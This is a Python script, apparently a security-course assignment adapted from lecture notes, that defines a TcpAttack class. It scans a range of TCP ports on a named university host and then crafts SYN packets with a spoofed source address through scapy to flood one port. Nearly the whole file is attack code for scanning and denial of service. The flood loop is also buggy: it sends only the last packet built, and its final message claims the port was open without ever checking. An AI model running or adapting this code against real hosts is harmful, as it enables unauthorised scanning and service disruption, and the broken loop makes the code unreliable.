import sys
from BitVector import *
import socket
from scapy.all import *
from scapy.layers.inet import TCP,IP



class TcpAttack():
    def __init__(self, spoofIP : str, targetIP: str)->None:
        # spoofIP : String containing the IP address to spoof
        self.spoof = spoofIP
        self.target = targetIP
        
#**************************************************************************************************************************************************************
    def scanTarget(self, rangeStart:int, rangeEnd:int)->None:
        FILEOUT = open("openports.txt","w") #open the output file
        #CODE TAKEN FROM AVI KAK LECTURE
        for testport in range(rangeStart, rangeEnd+1):                               #(6)
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               #(7)
            sock.settimeout(0.1)                                                     #(8)
            try:                                                                     #(9)
                sock.connect((self.target, testport))                              #(10)
                con_string = str(testport) #Convert to a string
                FILEOUT.write(con_string + '\n') #Write to the output file                                    
            except:                                                                  #(15)
                pass
    #No return in this funcion
        
#**************************************************************************************************************************************************************
    def attackTarget(self, port:int, numSyn:int)->int:
        #Code addapted from AVI KAK LECTURE NOTES
        for i in range(numSyn):                                                                         #(5)
            IP_header = IP(src = self.spoof, dst = self.target)                                         #(6)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)                            #(7)
            packet = IP_header / TCP_header                                                             #(8)
        try:                                                                                            #(9)
            
            send(packet)                                                                                #(10)
        except Exception as e:                                                                          #(11)
            print (e)                                                                                   #(11)
            #return(0)
        return(1)

#**************************************************************************************************************************************************************
if __name__ == "__main__":
    spoof_test = '10.10.10.10'
    target_test = 'moonshine.ecn.purdue.edu'
    start_test = 1000
    end_test = 4000
    port_test = 1716
    numSyn_test = 100
    tcp = TcpAttack(spoof_test,target_test)
    tcp.scanTarget(start_test,end_test)
    if tcp.attackTarget(port_test,numSyn_test):
        print(f"Port {port_test} was open, and flooded with {numSyn_test} SYN packets")
    

